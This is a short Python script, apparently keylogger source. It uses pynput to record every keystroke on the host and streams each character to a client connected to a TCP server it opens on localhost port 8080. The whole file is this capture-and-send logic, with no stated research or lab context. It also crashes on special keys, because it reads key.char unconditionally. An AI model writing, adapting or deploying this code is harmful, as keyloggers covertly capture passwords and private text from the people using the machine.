from pynput.keyboard import Key, Listener
import socket

def create_server():
    print("Starting server...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 8080))
    server.listen(5)
    print("Server listening")
    return server


def accept_connections(server):
    client_socket, addr = server.accept()
    print(f"Connection from {addr}")
    return client_socket

server_socket = create_server()
client_socket = accept_connections(server_socket)

def send_key(key):
    client_socket.send(key.char.encode())
    print(f"Sent key: {key}")



with Listener(on_press=send_key) as key_listener:
    key_listener.join()

